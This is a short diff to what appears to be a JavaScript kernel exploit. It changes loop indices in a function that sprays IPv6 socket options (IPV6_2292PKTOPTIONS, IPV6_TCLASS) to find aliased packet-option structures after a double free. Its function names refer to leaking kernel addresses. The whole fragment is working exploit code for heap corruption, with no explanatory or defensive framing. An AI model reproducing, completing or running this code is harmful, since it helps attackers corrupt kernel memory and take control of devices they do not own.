@@ -1095,17 +1095,17 @@ function leak_kernel_addrs(sd_pair) {
 
 function make_aliased_pktopts(sds) {
     const tclass = new Word();
-    for (let loop = 1; loop < num_alias; loop++) {
-        for (let i = 1; i < sds.length; i++) {
+    for (let loop = 0; loop < num_alias; loop++) {
+        for (let i = 0; i < num_sds; i++) {
             setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
         }
 
-        for (let i = 1; i < sds.length; i++) {
+        for (let i = 0; i < num_sds; i++) {
             tclass[0] = i;
             ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
         }
 
-        for (let i = 1; i < sds.length; i++) {
+        for (let i = 0; i < sds.length; i++) {
             gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
             const marker = tclass[0];
             if (marker !== i) {
@@ -1116,7 +1116,7 @@ function make_aliased_pktopts(sds) {
                 sds.splice(i, 1);
                 // add pktopts to the new sockets now while new allocs can't
                 // use the double freed memory
-                for (let i = 1; i < 2; i++) {
+                for (let i = 0; i < 2; i++) {
                     const sd = new_socket();
                     ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
                     sds.push(sd);
